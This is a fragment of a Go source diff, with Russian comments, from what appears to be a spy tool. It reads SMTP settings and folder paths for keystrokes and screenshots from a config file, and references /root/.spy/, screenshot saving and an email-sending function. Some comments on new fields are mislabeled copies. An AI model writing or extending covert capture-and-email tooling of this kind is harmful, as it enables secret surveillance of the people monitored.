@@ -21,7 +21,8 @@ var port_int int
 var port_int1 int
 var sbj string
 var body string
-
+var fld_key string
+var fld_scr string
 func main() {
 
 file, _ := os.Open("config") //имя файла, откуда читаем настройки
@@ -42,14 +43,12 @@ port_int, _ := strconv.ParseInt(port, 10, 0)	// SMTP-порт - адский к�
 port_int1 = int(port_int)			// SMTP-порт - адский конверт в int
 to := strings.Split(arr[4], ":")		// E-mail получателя
 sbj := strings.Split(arr[5], ":")		// Тема письма
-body := strings.Split(arr[5], ":")		// Тело письма
+body := strings.Split(arr[6], ":")		// Тело письма
+fld_key := strings.Split(arr[7], ":")		// Тема письма
+fld_scr := strings.Split(arr[8], ":")		// Тело письма
 defer file.Close()
 
-const (
-	// Home directory for spy.
-	spyhome = "/root/.spy/"
-	// Screens directory.
-	screensHome = spyhome + "/screens/"
+/* const (
 	// log file name.
 	logFileName = "file.log"
 	// Save photo interval.
@@ -63,8 +62,9 @@ const (
 	// Need to save screen shots?
 	isScreenShot = true
 )
-
+*/
 // Get file contents as string.
+	/*
 func fileGetContents(filename string) string {
 	buf, _ := ioutil.ReadFile(filename)
 	return string(buf)
@@ -105,7 +105,7 @@ func sendEmail(header, body string) {
 		panic(err)
 	}
 }
-
+*/
 // Get current date format as DD.MM.YYYY
 func getCurrentDate() string {
 	return time.Now().Format("02.01.2006")
